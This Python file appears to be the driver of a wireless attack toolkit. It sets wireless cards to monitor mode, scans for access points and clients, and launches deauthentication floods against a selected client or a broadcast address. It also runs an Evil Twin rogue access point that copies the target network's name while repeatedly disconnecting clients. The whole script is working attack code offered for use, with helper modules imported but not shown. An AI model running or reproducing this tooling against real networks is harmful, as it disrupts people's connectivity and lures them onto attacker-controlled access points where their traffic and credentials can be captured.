#!/usr/bin/env python3

import os
import sys
import time
import threading
import subprocess
from pathlib import Path

# Add framework modules to path
sys.path.append('evil_twin_framework')

# Import modules
import network
import dauth
import data
import bash_captive

# Global variables
monitor_interface = None
ap_interface = "wlan0"
current_channel = None
scanning_active = False
evil_twin_active = False

def check_root():
    """Check if running as root"""
    if os.geteuid() != 0:
        print("[ERROR] This script must be run as root!")
        sys.exit(1)

def setup_monitor_mode(interface="wlan0"):
    """Setup monitor mode on interface"""
    global monitor_interface
    
    print(f"[*] Setting up monitor mode on {interface}...")
    
    # Check if already in monitor mode
    mon_check = f"{interface}mon"
    result = subprocess.run(['iwconfig', mon_check], capture_output=True, stderr=subprocess.DEVNULL)
    
    if result.returncode == 0:
        monitor_interface = mon_check
        print(f"[✓] Monitor mode already active on {monitor_interface}")
        return monitor_interface
    
    # Try to create monitor interface
    subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], capture_output=True)
    result = subprocess.run(['sudo', 'airmon-ng', 'start', interface], capture_output=True)
    
    if f"{interface}mon" in result.stdout.decode():
        monitor_interface = f"{interface}mon"
    else:
        # Alternative method
        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'])
        subprocess.run(['sudo', 'iw', 'dev', interface, 'set', 'monitor', 'control'])
        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'])
        monitor_interface = interface
    
    print(f"[✓] Monitor mode enabled on {monitor_interface}")
    return monitor_interface

def stop_monitoring():
    """Stop all monitoring and channel hopping activities"""
    global scanning_active
    
    print("[*] Stopping monitoring and channel hopping...")
    
    # Stop the network sniffer
    network.stop_sniffing()
    
    # Kill channel hopping processes
    subprocess.run(['sudo', 'pkill', '-f', 'channel_hopper'], stderr=subprocess.DEVNULL)
    subprocess.run(['sudo', 'pkill', '-f', 'iwconfig.*channel'], stderr=subprocess.DEVNULL)
    
    # Set monitor interface to a fixed channel to stop hopping
    if monitor_interface and current_channel:
        subprocess.run(['sudo', 'iwconfig', monitor_interface, 'channel', str(current_channel)], 
                      stderr=subprocess.DEVNULL)
    
    scanning_active = False
    time.sleep(1)  # Give time for processes to stop
    print("[✓] Monitoring stopped")

def resume_monitoring():
    """Resume monitoring after Evil Twin is done"""
    global scanning_active
    
    if evil_twin_active:
        return  # Don't resume if Evil Twin is still active
    
    print("[*] Resuming network monitoring...")
    
    if monitor_interface:
        # Restart scanning in a new thread
        scanning_active = True
        threading.Thread(target=network.start_sniff, args=(monitor_interface,), daemon=True).start()
        print("[✓] Monitoring resumed")
    else:
        print("[!] No monitor interface available")

def scan_networks(duration=30):
    """Scan for networks and clients"""
    global scanning_active, current_channel
    
    if not monitor_interface:
        print("[ERROR] No monitor interface available")
        return
    
    print(f"\n[*] Scanning for {duration} seconds...")
    print("[*] Press Ctrl+C to stop early\n")
    
    scanning_active = True
    
    # Start sniffing in background
    scan_thread = threading.Thread(target=network.start_sniff, args=(monitor_interface,), daemon=True)
    scan_thread.start()
    
    try:
        # Show progress
        for i in range(duration):
            networks_found = len(network.get_networks())
            print(f"\r[*] Scanning... {i+1}/{duration}s | Networks: {networks_found}", end='')
            time.sleep(1)
            
            # Check if we should stop
            if not scanning_active:
                break
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted")
    
    # Stop sniffing
    network.stop_sniffing()
    scanning_active = False
    
    print(f"\n[✓] Scan complete. Found {len(network.get_networks())} networks")

def select_target():
    """Select target AP and client"""
    networks = network.get_networks()
    clients = network.get_clients()
    
    if not networks:
        print("[!] No networks found. Scan first!")
        return None, None, None
    
    # Display networks
    data.display_networks(networks, clients)
    
    # Select AP
    while True:
        try:
            ap_idx = input("\nSelect target AP (index): ").strip()
            if ap_idx.lower() == 'q':
                return None, None, None
            
            ap_idx = int(ap_idx)
            bssid, ap_info = network.get_network_by_index(ap_idx)
            
            if bssid:
                current_channel = ap_info.get('Channel', 6)
                break
            else:
                print("[!] Invalid selection")
        except (ValueError, KeyboardInterrupt):
            return None, None, None
    
    # Display selected AP
    data.display_selected_ap(ap_info, bssid)
    
    # Check for clients
    if not clients.get(bssid):
        print("\n[!] No clients connected to this AP")
        use_broadcast = input("Use broadcast deauth? (y/n): ").strip().lower()
        if use_broadcast == 'y':
            return bssid, ap_info, "FF:FF:FF:FF:FF:FF"
        return bssid, ap_info, None
    
    # Display clients
    data.display_clients(bssid, clients)
    
    # Select client
    while True:
        try:
            client_idx = input("\nSelect target client (index, or 'b' for broadcast): ").strip()
            
            if client_idx.lower() == 'q':
                return None, None, None
            elif client_idx.lower() == 'b':
                return bssid, ap_info, "FF:FF:FF:FF:FF:FF"
            
            client_idx = int(client_idx)
            client_mac, client_info = network.get_client_by_index(bssid, client_idx)
            
            if client_mac:
                break
            else:
                print("[!] Invalid selection")
        except (ValueError, KeyboardInterrupt):
            return None, None, None
    
    # Display final selection
    data.display_final_selection(ap_info, bssid, client_mac, client_info)
    
    return bssid, ap_info, client_mac

def run_evil_twin():
    """Run Evil Twin attack with proper interface management"""
    global evil_twin_active, current_channel
    
    # Select target
    bssid, ap_info, client_mac = select_target()
    
    if not bssid:
        print("[!] No target selected")
        return
    
    ssid = ap_info.get('SSID', 'Free-WiFi')
    channel = ap_info.get('Channel', 6)
    current_channel = channel
    
    print(f"\n[*] Target AP: {ssid} ({bssid})")
    print(f"[*] Channel: {channel}")
    
    if client_mac:
        print(f"[*] Target Client: {client_mac}")
    else:
        print("[*] No client selected - Evil Twin will wait for connections")
    
    # CRITICAL: Stop monitoring before setting up Evil Twin
    print("\n[IMPORTANT] Stopping monitor mode scanning to setup Evil Twin...")
    stop_monitoring()
    
    # Set monitor interface to target channel (but don't hop)
    if monitor_interface:
        print(f"[*] Setting monitor interface to channel {channel}...")
        subprocess.run(['sudo', 'iwconfig', monitor_interface, 'channel', str(channel)], 
                      stderr=subprocess.DEVNULL)
    
    # Setup Evil Twin AP
    print("\n[*] Starting Evil Twin Access Point...")
    evil_twin_active = True
    
    # Set the deauth interface for bash_captive to use
    bash_captive.deauth_interface = monitor_interface
    
    # Start Evil Twin
    if not bash_captive.setup_evil_twin(ssid, channel):
        print("[ERROR] Failed to setup Evil Twin")
        evil_twin_active = False
        resume_monitoring()
        return
    
    # Now that AP is running, start deauth attack if we have a target
    if client_mac and monitor_interface:
        print(f"\n[*] Starting deauth attack using {monitor_interface}...")
        
        if client_mac == "FF:FF:FF:FF:FF:FF":
            print("[*] Using broadcast deauth to disconnect all clients")
        
        # Start continuous deauth in background
        deauth_thread = threading.Thread(
            target=continuous_deauth,
            args=(client_mac, bssid, monitor_interface),
            daemon=True
        )
        deauth_thread.start()
    
    # Wait for user to stop
    try:
        input("\n[*] Evil Twin is running. Press Enter to stop...\n")
    except KeyboardInterrupt:
        pass
    
    # Stop everything
    print("\n[*] Stopping Evil Twin attack...")
    
    # Stop deauth if running
    if dauth.is_attack_running():
        dauth.stop_attack()
    
    # Stop Evil Twin
    bash_captive.stop_evil_twin()
    evil_twin_active = False
    
    # Resume monitoring
    resume_monitoring()
    
    print("[✓] Evil Twin attack stopped")

def continuous_deauth(client_mac, bssid, interface):
    """Run continuous deauth attack while Evil Twin is active"""
    while evil_twin_active:
        if not dauth.is_attack_running():
            # Start a 30-second deauth attack
            dauth.start_attack(client_mac, bssid, interface, attack_duration=30)
        time.sleep(25)  # Wait before next cycle
    
    # Stop any remaining attack
    if dauth.is_attack_running():
        dauth.stop_attack()

def run_deauth_only():
    """Run standalone deauth attack"""
    # Select target
    bssid, ap_info, client_mac = select_target()
    
    if not bssid or not client_mac:
        print("[!] No target selected")
        return
    
    # Stop monitoring to avoid channel hopping during attack
    stop_monitoring()
    
    # Set channel
    channel = ap_info.get('Channel', 6)
    if monitor_interface:
        print(f"[*] Setting monitor interface to channel {channel}...")
        subprocess.run(['sudo', 'iwconfig', monitor_interface, 'channel', str(channel)])
    
    # Get duration
    try:
        duration = int(input("Attack duration in seconds (default 30): ") or "30")
    except ValueError:
        duration = 30
    
    # Run deauth attack
    print(f"\n[*] Starting deauth attack for {duration} seconds...")
    dauth.deauth_attack(client_mac, bssid, monitor_interface, duration)
    
    # Resume monitoring
    resume_monitoring()

def main_menu():
    """Display main menu"""
    print("\n" + "="*50)
    print("       WiFi Attack Framework")
    print("="*50)
    print("[s] Scan for networks")
    print("[d] Deauth attack")
    print("[e] Evil Twin attack")
    print("[r] Resume monitoring")
    print("[q] Quit")
    print("="*50)
    return input("Select option: ").strip().lower()

def cleanup():
    """Cleanup on exit"""
    print("\n[!] Caught interrupt signal, cleaning up...")
    
    # Stop any running attacks
    if dauth.is_attack_running():
        dauth.stop_attack()
    
    # Stop Evil Twin if running
    if evil_twin_active:
        bash_captive.stop_evil_twin()
    
    # Stop monitoring
    if scanning_active:
        network.stop_sniffing()
    
    print("[✓] Cleanup complete. Exiting.")

def main():
    """Main function"""
    check_root()
    
    print("\n[*] WiFi Attack Framework Starting...")
    
    # Setup monitor mode
    # Check for USB adapter first
    usb_iface = None
    ifaces = subprocess.run(['iwconfig'], capture_output=True, text=True).stdout
    
    if 'wlx' in ifaces:  # USB adapter usually starts with wlx
        for line in ifaces.split('\n'):
            if 'wlx' in line:
                usb_iface = line.split()[0]
                break
    
    if usb_iface:
        print(f"[*] Found USB adapter: {usb_iface}")
        use_usb = input("Use USB adapter for monitoring? (y/n): ").strip().lower()
        if use_usb == 'y':
            setup_monitor_mode(usb_iface)
        else:
            setup_monitor_mode("wlan0")
    else:
        setup_monitor_mode("wlan0")
    
    if not monitor_interface:
        print("[ERROR] Failed to setup monitor mode")
        sys.exit(1)
    
    try:
        while True:
            choice = main_menu()
            
            if choice == 'q':
                break
            elif choice == 's':
                scan_networks()
            elif choice == 'd':
                run_deauth_only()
            elif choice == 'e':
                run_evil_twin()
            elif choice == 'r':
                resume_monitoring()
            else:
                print("[!] Invalid option")
                
    except KeyboardInterrupt:
        cleanup()
    except Exception as e:
        print(f"[ERROR] Unexpected error: {e}")
        cleanup()
    
    cleanup()

if __name__ == "__main__":
    main()
